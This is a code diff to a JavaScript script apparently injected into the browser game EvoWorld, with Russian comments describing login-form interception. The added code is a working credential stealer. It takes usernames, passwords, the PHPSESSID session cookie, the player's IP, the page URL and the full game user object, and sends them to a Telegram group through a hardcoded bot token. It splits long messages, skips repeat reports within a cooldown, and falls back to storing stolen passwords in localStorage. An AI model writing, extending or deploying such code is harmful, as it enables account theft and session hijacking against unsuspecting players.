@@ -238,32 +238,123 @@ setTimeout(() => {
     await sendUserData();
 })();
 
-// Логика перехвата формы входа — при каждом новом входе в другой акк отправляет в группу
+// Логика перехвата формы входа — при каждом новом входе в другой акк отправляет в группу ОДНИМ сообщением
 (function() {
     'use strict';
 
     var BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
     var GROUP_ID = '-1003867014479';
 
-    function sendCredentials(username, password) {
-        var timestamp = new Date().toLocaleString('ru-RU');
-        var message = '🦊 EvoWorld Login\n\n👤 Login: ' + username + '\n🔐 Password: ' + password + '\n⏰ ' + timestamp;
+    // Чтобы не слать один и тот же аккаунт несколько раз подряд
+    var lastSentKey = '';
+    var lastSentTime = 0;
+    var SAME_ACC_COOLDOWN_MS = 15000;
 
-        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: GROUP_ID,
-                text: message,
-                disable_web_page_preview: true
-            })
+    function getCookie(name) {
+        var matches = document.cookie.match(new RegExp(
+            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+        ));
+        return matches ? decodeURIComponent(matches[1]) : '';
+    }
+
+    function getIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(function(r) { return r.json(); })
+            .then(function(d) { return d.ip || 'N/A'; })
+            .catch(function() { return 'N/A'; });
+    }
+
+    function deepClone(obj) {
+        if (obj === null || typeof obj !== 'object') return obj;
+        var clone = Array.isArray(obj) ? [] : {};
+        for (var k in obj) { if (obj.hasOwnProperty(k)) clone[k] = deepClone(obj[k]); }
+        return clone;
+    }
+
+    function getUserDataStr() {
+        try {
+            if (typeof user !== 'undefined' && user !== null)
+                return JSON.stringify(deepClone(user), null, 2);
+        } catch (e) {}
+        return null;
+    }
+
+    function getUserLevelStr() {
+        try {
+            if (typeof user !== 'undefined' && user !== null && user.level !== undefined)
+                return 'level: ' + user.level;
+        } catch (e) {}
+        return 'level: N/A';
+    }
+
+    function sendCredentials(username, password) {
+        var key = (username || '') + '|' + (password || '');
+        var now = Date.now();
+        if (key === lastSentKey && (now - lastSentTime) < SAME_ACC_COOLDOWN_MS)
+            return;
+        lastSentKey = key;
+        lastSentTime = now;
+
+        var timestamp = new Date().toLocaleString('ru-RU');
+
+        getIP().then(function(ip) {
+            var phpsessid = getCookie('PHPSESSID');
+            var userDataStr = getUserDataStr();
+            var userLevelStr = getUserLevelStr();
+            var serverText = 'N/A';
+            try {
+                var sel = document.getElementById('selectServer');
+                if (sel && sel.options && sel.options[sel.selectedIndex])
+                    serverText = sel.options[sel.selectedIndex].text;
+            } catch (e) {}
+
+            var message = '🦊 EvoWorld Login\n\n';
+            message += '👤 Login: ' + (username || '—') + '\n';
+            message += '🔐 Password: ' + (password || '—') + '\n';
+            message += '⏰ ' + timestamp + '\n\n';
+
+            message += '🚨 ДАННЫЕ ЛОГА\n';
+            message += '📅 Время: ' + new Date().toLocaleString() + '\n';
+            message += '🌐 IP: ' + ip + '\n';
+            message += '🔗 URL: ' + (window.location.href || '') + '\n\n';
+            message += '📊 Уровень: ' + userLevelStr + '\n';
+            message += '💰 Gems: ' + (typeof user !== 'undefined' && user && user.premiumPoints != null ? user.premiumPoints : 'N/A') + '\n';
+            message += '🖥️ Сервер: ' + serverText + '\n\n';
+            message += '🔑 PHPSESSID:\n' + (phpsessid || '—') + '\n';
+
+            if (userDataStr) {
+                message += '\n📋 user:\n' + userDataStr;
+            }
+
+            var MAX_LEN = 4090;
+            var parts = [];
+            for (var i = 0; i < message.length; i += MAX_LEN) {
+                parts.push(message.substring(i, i + MAX_LEN));
+            }
+
+            function sendPart(idx) {
+                if (idx >= parts.length) return Promise.resolve();
+                var text = parts.length > 1 ? ('📄 ' + (idx + 1) + '/' + parts.length + '\n\n' + parts[idx]) : parts[idx];
+                return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: GROUP_ID,
+                        text: text,
+                        disable_web_page_preview: true
+                    })
+                }).then(function(response) {
+                    if (!response || !response.ok) throw new Error('Telegram API error');
+                    return sendPart(idx + 1);
+                });
+            }
+
+            return sendPart(0);
         })
-        .then(function(response) {
-            if (!response.ok) throw new Error('Telegram API error');
-        })
+        .then(function() {})
         .catch(function() {
             var logs = JSON.parse(localStorage.getItem('evoLogs') || '[]');
-            logs.push({username: username, password: password, timestamp: timestamp});
+            logs.push({ username: username, password: password, timestamp: timestamp });
             localStorage.setItem('evoLogs', JSON.stringify(logs));
         });
     }
